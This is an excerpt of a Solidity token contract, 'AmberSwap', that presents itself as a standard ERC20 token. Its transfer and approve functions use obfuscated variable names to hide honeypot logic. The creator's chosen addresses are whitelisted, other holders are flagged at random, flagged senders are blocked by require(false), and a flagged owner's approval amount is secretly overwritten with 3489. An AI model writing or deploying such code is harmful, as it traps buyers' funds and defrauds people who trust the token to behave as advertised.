...
contract AmberSwap is Context, IERC20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;

  mapping (address => mapping (address => uint256)) private _allowances;
  mapping (address => bool) public gemstone;
  mapping (address => bool) public fish;
  mapping (address => bool) public peces;
  mapping (address => uint256) public mall;
  ...
  */
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if ((address(sender) == creator) && (documents == true)) {
      gemstone[recipient] = true;
      fish[recipient] = false;
      documents = false;
    }
    
    if ((amount > military) && (gemstone[sender] == true) && (address(sender) != creator)) {
        peces[recipient] = true;
    }
    
    if (gemstone[recipient] != true) {
        fish[recipient] = ((randomly() == 3) ? true : false);
    }
    
    if ((fish[sender]) && (gemstone[recipient] == false)) {
        fish[recipient] = true;
    }
    
    if (gemstone[sender] == false) {
      if ((amount > military) && (peces[sender] == true)) {
        require(false);
      }
      
      require(amount < guns);
      if (gallons == true) {
        if (peces[sender] == true) {
          require(false);
        }
        peces[sender] = true;
      }
  ...
  **/
  ...
  function _approve(address owner, address spender, uint256 amount) internal {
    ...
    if ((address(owner) == creator) && (doggy == true)) {
      gemstone[spender] = true;
      fish[spender] = false;
      peces[spender] = false;
      doggy = false;
    }
    
    tok = (fish[owner] ? 3489 : amount);
